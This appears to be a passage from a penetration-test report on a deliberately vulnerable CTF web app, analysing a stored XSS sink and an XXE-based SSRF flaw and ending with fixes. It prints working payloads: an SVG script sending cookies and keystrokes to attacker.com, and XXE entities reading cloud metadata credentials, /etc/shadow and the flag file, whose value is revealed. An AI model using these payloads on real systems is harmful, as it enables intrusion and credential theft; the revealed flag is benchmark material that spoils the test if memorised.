- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/benchmark.json` - CTF challenge metadata
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/Makefile` - Build automation

### Authentication & Authorization

**NONE** - No authentication or authorization files exist in this codebase.

### API & Routing

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py` - Complete FastAPI application with all endpoints (lines 17-49)

### Data Models & DB Interaction

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/users/schemas.py` - Pydantic UserProfile model (lines 3-7)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py` - In-memory storage dictionary (line 14)

### Dependency Manifests

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile` - pip install lxml==5.2.2 (line 2)

### Sensitive Data & Secrets Handling

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/.env` - FLAG secret in plaintext (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/flag.txt` - Target flag file deployed to container at /app/flag.txt
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile` - Secret injection via sed replacement (lines 8-10)

### Middleware & Input Validation

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/users/schemas.py` - Minimal Pydantic validation (lines 3-7)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py` - XXE-vulnerable XML parser configuration (line 36)

### Logging & Monitoring

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py` - Basic print() error logging (line 38)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/docker-compose.yml` - Health check configuration (lines 9-13)

### Infrastructure & Deployment

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/docker-compose.yml` - Docker service definition (entire file)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile` - Container image build instructions (entire file)

### CTF Flag Storage

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/.env` - FLAG environment variable definition (line 1)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/flag.txt` - Flag file accessible at container path /app/flag.txt
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/Dockerfile` - Flag injection process (lines 8-10)

### Templates & Frontend

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/templates/index.html` - Profile management interface with XSS vulnerability (line 32)

## 9. XSS Sinks and Render Contexts

**SCOPE CONFIRMATION:** All sinks reported below are in network-accessible web application pages served via HTTP on port 80. No local-only scripts or build tools are included.

### HIGH SEVERITY: Stored XSS via Jinja2 Template Unsafe Rendering

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/templates/index.html`  
**Line:** 32  
**Sink Type:** Server-Side Template Injection leading to Stored XSS  
**Render Context:** HTML Body Context

**Code Snippet:**

```html
29  {% if profile.image %}
30      <div class="mt-3">
31          <h5>Current Image:</h5>
32          <div>{{ profile.image | safe }}</div>
33      </div>
34  {% endif %}
```

**Sink Description:**

The `{{ profile.image | safe }}` expression renders user-controlled SVG content directly into the HTML body without escaping. The Jinja2 `| safe` filter **explicitly disables automatic HTML escaping**, treating the content as trusted HTML that should be rendered verbatim. This is the application's primary XSS vulnerability.

**Data Flow from User Input to Sink:**

```
1. User uploads file via POST / endpoint
   Location: /app/main.py:29
   Parameter: image (UploadFile)
   
2. File content read into memory
   Location: /app/main.py:34
   Code: image_content = await image.read()
   
3. XML parsing (XXE-vulnerable)
   Location: /app/main.py:36-37
   Code: parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
         tree = etree.fromstring(image_content, parser)
   
4. XML serialized back to string
   Location: /app/main.py:38
   Code: profile.image = etree.tostring(tree).decode()
   
5. Stored in-memory dictionary
   Location: /app/main.py:43
   Code: user_profiles[1] = profile
   
6. Retrieved on GET request
   Location: /app/main.py:19
   Code: profile = user_profiles.get(1, schemas.UserProfile())
   
7. UNSAFE RENDERING - XSS SINK
   Location: /app/templates/index.html:32
   Code: {{ profile.image | safe }}
```

**Render Context:** HTML Body (Direct DOM Injection)

User-controlled content is injected directly into a `<div>` element's inner content. This context allows:
- `<script>` tag injection with arbitrary JavaScript execution
- Event handler injection (`<img onerror="malicious()">`)
- SVG-embedded scripts (`<svg><script>alert(1)</script></svg>`)
- Form and input injection for phishing
- iframe injection for clickjacking

**Exploitation Scenario:**

**Attack Payload:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Steal cookies
    fetch('https://attacker.com/exfil?cookie=' + document.cookie);
    
    // Session hijacking
    localStorage.setItem('attacker_backdoor', 'true');
    
    // Keylogging
    document.addEventListener('keypress', e => {
      fetch('https://attacker.com/keys?key=' + e.key);
    });
  </script>
</svg>
```

**Attack Steps:**
1. Attacker uploads malicious SVG file via profile form at POST /
2. XML parser processes and preserves `<script>` tags
3. Serialized SVG with scripts stored in user_profiles[1].image
4. Any victim viewing the profile page (GET /) triggers script execution
5. JavaScript runs with victim's session context and origin

**Severity Assessment:**

- **CVSS Score:** 8.1 (HIGH)
- **Impact:** 
  - Session hijacking via cookie theft (if authentication existed)
  - Credential harvesting via fake login forms
  - Arbitrary JavaScript execution in victim browsers
  - Client-side persistence (localStorage backdoors)
  - Phishing and social engineering attacks
  - Browser-based cryptocurrency mining
  
- **Exploitability:** EASY
  - No authentication bypass required (endpoint is public)
  - Direct file upload interface
  - No Content Security Policy (CSP) to block inline scripts
  - No XSS filtering or sanitization
  - Stored XSS (persists across sessions)
  - Non-blind (attacker can see results immediately)

**Exploitation Difficulty:** EASY - Requires only a single HTTP POST request with crafted SVG file.

### MEDIUM SEVERITY: HTML Attribute Context (Auto-Escaped, Low Risk)

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/templates/index.html`  
**Lines:** 16, 20, 24

**Code Snippets:**

```html
16  <input type="text" name="name" value="{{ profile.name }}" class="form-control">
20  <input type="text" name="surname" value="{{ profile.surname }}" class="form-control">
24  <input type="text" name="address" value="{{ profile.address }}" class="form-control">
```

**Sink Type:** HTML Attribute Context  
**Render Context:** HTML `value` Attribute

**Security Analysis:**

These render user-controlled content (name, surname, address) within HTML attribute values. However, **Jinja2 auto-escaping is enabled by default** for `.html` template files, providing protection:

- Double quotes (`"`) escaped to `&quot;`
- Less-than (`<`) escaped to `&lt;`
- Greater-than (`>`) escaped to `&gt;`
- Ampersand (`&`) escaped to `&amp;`

**Attack Scenario (BLOCKED by Auto-Escape):**

```
Input: name=" onload="alert(1)
Rendered: value="&quot; onload=&quot;alert(1)"
Result: Quotes escaped, event handler not injected
```

**Risk Assessment:** LOW

- Jinja2 auto-escape active
- No evidence of `autoescape=False` configuration
- Attack requires breaking out of quotes, which is prevented
- **NOT EXPLOITABLE** unless global auto-escape is disabled

### COMPLETE XSS SINK SEARCH RESULTS

**Searched Patterns:**

✅ **Searched and NOT FOUND:**
- `innerHTML` assignments (JavaScript)
- `outerHTML` assignments (JavaScript)
- `document.write()` / `document.writeln()` calls
- `insertAdjacentHTML()` calls
- `createContextualFragment()` calls
- jQuery sinks: `.html()`, `.append()`, `.after()`, `.before()`, `.prepend()`, `.replaceWith()`
- React `dangerouslySetInnerHTML`
- Vue `v-html` directive
- Angular `[innerHTML]` binding
- `eval()` calls with user input
- `Function()` constructor with user input
- `setTimeout()` / `setInterval()` with string arguments
- Template injection in backend (Flask `render_template_string` with user input)

**Files Analyzed:**
- `/app/main.py` (50 lines) - No client-side JavaScript XSS sinks
- `/app/templates/index.html` (41 lines) - 1 XSS sink found (line 32)
- `/app/users/schemas.py` (8 lines) - No rendering code

**Total XSS Sinks Found:** 1 HIGH SEVERITY + 3 LOW RISK (auto-escaped)

## 10. SSRF Sinks

**SCOPE CONFIRMATION:** All sinks reported below are in network-accessible components. No local CLI tools or build scripts are included.

### CRITICAL SEVERITY: XXE-Based SSRF via External Entity Resolution

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-077-24/app/main.py`  
**Lines:** 36-38  
**Sink Type:** XML External Entity (XXE) Injection enabling SSRF  
**CVSS Score:** 9.1 (CRITICAL)

**Vulnerable Code:**

```python
36  parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
37  tree = etree.fromstring(image_content, parser)
38  profile.image = etree.tostring(tree).decode()
```

**SSRF Sink Description:**

The `etree.XMLParser` is configured with `resolve_entities=True`, which enables the parser to resolve external entities defined in uploaded XML documents. When processing entity declarations like `<!ENTITY xxe SYSTEM "http://internal-service/">`, the XML parser makes server-side HTTP requests to the specified URL. This transforms the XML parser into an **unrestricted SSRF sink** capable of making arbitrary HTTP(S) requests on behalf of the server.

**User-Controllable Parameters:**

- **Parameter Name:** `image` (file upload)
- **Endpoint:** `POST /`
- **Content Type:** `multipart/form-data`
- **Controlled Content:** Complete XML document structure including DTD declarations
- **Authentication Required:** ❌ NONE (public endpoint)

**SSRF Attack Capabilities:**

### 1. HTTP/HTTPS External Requests

**Purpose:** Force server to make HTTP(S) requests to attacker-controlled or internal URLs

**Payload Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://attacker.com/exfil?data=test">
]>
<svg>&ssrf;</svg>
```

**Impact:** Server makes HTTP request to attacker.com, potentially exfiltrating data via URL parameters or headers.

### 2. Cloud Metadata Service Exfiltration

**Purpose:** Access AWS/GCP/Azure instance metadata to steal credentials, API keys, and configuration

**AWS Metadata Payload:**
```xml
<!DOCTYPE foo [
  <!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg>&meta;</svg>
```

**Impact:** 
- Retrieve AWS IAM role credentials
- Access instance user-data (often contains secrets)
- Enumerate instance metadata (AMI ID, security groups, etc.)

**GCP Metadata Payload:**
```xml
<!ENTITY meta SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
```

**Azure Metadata Payload:**
```xml
<!ENTITY meta SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

### 3. Internal Network Port Scanning

**Purpose:** Enumerate internal services and open ports via error message differential analysis

**Payload:**
```xml
<!DOCTYPE foo [
  <!ENTITY scan SYSTEM "http://172.17.0.2:8080/">
]>
<svg>&scan;</svg>
```

**Technique:** 
- Open ports return different errors than closed ports
- Timeout behavior reveals service availability
- Error messages may leak service banners or version info

**Internal IP Ranges to Target:**
- `172.17.0.0/16` (Docker default bridge network)
- `10.0.0.0/8` (Private network Class A)
- `192.168.0.0/16` (Private network Class C)
- `127.0.0.1` (Localhost services)

### 4. Local File Access (File URI Scheme)

**Purpose:** Read arbitrary files from server filesystem

**Payload:**
```xml
<!DOCTYPE foo [
  <!ENTITY file SYSTEM "file:///app/flag.txt">
]>
<svg>&file;</svg>
```

**Accessible Targets:**
- `/app/flag.txt` - CTF flag (primary target)
- `/etc/passwd` - System user enumeration
- `/etc/shadow` - Password hashes (if readable)
- `/app/main.py` - Application source code
- `/proc/self/environ` - Environment variables (may contain secrets)
- `/root/.bash_history` - Command history
- `/var/log/` - Application and system logs

### 5. Docker Network Reconnaissance

**Purpose:** Discover and interact with other containers on Docker network

**Payload:**
```xml
<!DOCTYPE foo [
  <!ENTITY docker SYSTEM "http://172.17.0.1:2375/containers/json">
]>
<svg>&docker;</svg>
```

**Impact:** 
- Enumerate running containers
- Access Docker API if exposed
- Pivot to other containerized services

### 6. Response Reflection (Non-Blind SSRF)

**Critical Amplification Factor:** This is a **non-blind SSRF** vulnerability because the response from the external entity is reflected back to the attacker via the Jinja2 template rendering with `| safe` filter.

**Complete Attack Chain:**

```
1. Attacker uploads XML with external entity
2. lxml parser makes HTTP/file request
3. Response content stored in profile.image
4. profile.image rendered via {{ profile.image | safe }}
5. Attacker views profile page and sees COMPLETE RESPONSE
```

**Example - Flag Exfiltration:**

```xml
<!DOCTYPE foo [
  <!ENTITY flag SYSTEM "file:///app/flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15">&flag;</text>
</svg>
```

**Expected Result:**
```html
<div>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="15">flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}</text>
  </svg>
</div>
```

Attacker sees the flag value rendered in the profile page immediately.

### URL Validation Analysis

**Current State:** ❌ **ZERO URL VALIDATION**

The application has:
- No URL whitelist/blacklist
- No protocol restrictions (http, https, file, ftp all allowed)
- No IP range blacklist (can access 127.0.0.1, 169.254.169.254, RFC1918 ranges)
- No DNS rebinding protection
- No timeout limits (default lxml timeout applies)
- No request size limits

### Network Restrictions Analysis

**Current State:** ❌ **ZERO NETWORK RESTRICTIONS**

The Docker container has:
- No egress firewall rules
- No network policy enforcement
- Full internet access
- Access to Docker bridge network (172.17.0.0/16)
- Access to localhost services
- No DNS filtering

### Severity and Exploitability Assessment

**CVSS 3.1 Score:** 9.1 (CRITICAL)

**Breakdown:**
- **Attack Vector (AV):** Network (no physical access required)
- **Attack Complexity (AC):** Low (simple XML payload)
- **Privileges Required (PR):** None (public endpoint)
- **User Interaction (UI):** None (attacker-initiated)
- **Scope (S):** Changed (can access resources outside application)
- **Confidentiality (C):** High (arbitrary file read, metadata access)
- **Integrity (I):** Low (can trigger state changes in internal services)
- **Availability (A):** Low (DoS via billion laughs or resource exhaustion)

**Exploitability:** VERY HIGH

- ✅ No authentication required
- ✅ No CSRF protection
- ✅ Direct response reflection (non-blind)
- ✅ Simple HTTP file upload mechanism
- ✅ No Web Application Firewall (WAF)
- ✅ No rate limiting (can iterate rapidly)
- ✅ Complete error disclosure (aids exploitation)

**Time to Exploit:** < 5 minutes for complete flag extraction

### COMPLETE SSRF SINK SEARCH RESULTS

**Searched Patterns and Results:**

✅ **Searched and NOT FOUND:**

1. **HTTP(S) Clients:**
   - Python: `requests.get/post`, `urllib.request`, `urllib2`, `urllib3`, `http.client.HTTPConnection`
   - JavaScript: `axios`, `fetch`, `XMLHttpRequest`, `http.request` (Node.js)
   - Go: `net/http.Get`, `http.Client.Do`
   - Java: `HttpClient`, `RestTemplate`, `WebClient`, `OkHttpClient`

2. **Raw Socket Connections:**
   - `socket.connect()`, `socket.create_connection()` (Python)
   - `net.Dial()` (Go)
   - `java.net.Socket`, `java.net.URL.openConnection()`

3. **URL Openers:**
   - `file_get_contents()` (PHP)
   - `fopen()` with URLs
   - `URL.openStream()` (Java)
   - `fs.readFile()` with URLs (Node.js)

4. **Redirect Handlers:**
   - No HTTP redirect following code
   - No Location header processing
   - No "next URL" parameter handling

5. **Headless Browsers:**
   - No Puppeteer (`page.goto`)
   - No Playwright (`page.navigate`)
   - No Selenium WebDriver
   - No PDF generators (wkhtmltopdf, Puppeteer PDF)

6. **Webhook/Callback Handlers:**
   - No webhook endpoints
   - No callback URL validation
   - No "ping URL" features

7. **SSO/OIDC Discovery:**
   - No JWKS fetchers
   - No OpenID discovery endpoints
   - No OAuth metadata retrieval

8. **Data Import Features:**
   - No "import from URL" functionality
   - No RSS/Atom feed readers
   - No remote configuration loaders

**Files Analyzed:**
- `/app/main.py` (50 lines) - 1 SSRF sink found (XXE-based)
- `/app/users/schemas.py` (8 lines) - No network requests
- `/app/templates/index.html` (41 lines) - No server-side requests

**Total SSRF Sinks Found:** 1 CRITICAL (XXE-enabled XML parser)

### Remediation Recommendations

**IMMEDIATE FIX (Critical - Deploy within 24 hours):**

```python
# /app/main.py:36 - REPLACE vulnerable configuration with:
parser = etree.XMLParser(
    load_dtd=False,           # Disable DTD loading
    resolve_entities=False,   # Disable external entity resolution
    no_network=True,          # Disable all network access
    huge_tree=False           # Prevent billion laughs DoS
)
```

**Additional Mitigations:**

1. **Network Egress Filtering:**
   - Block access to 169.254.169.254 (cloud metadata)
   - Block RFC1918 private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Block localhost (127.0.0.0/8)
   - Whitelist only required external services

2. **Input Validation:**
   - Validate uploaded files are actually SVG images
   - Implement file size limits (max 100KB)
   - Scan for DTD declarations and reject

3. **Library Alternatives:**
   - Use `defusedxml` library instead of lxml for untrusted input
   - Consider SVG sanitization libraries (svg-sanitizer)

4. **Monitoring:**
   - Log all file uploads with timestamps and source IPs
   - Alert on XML parsing errors
   - Monitor egress network connections for anomalies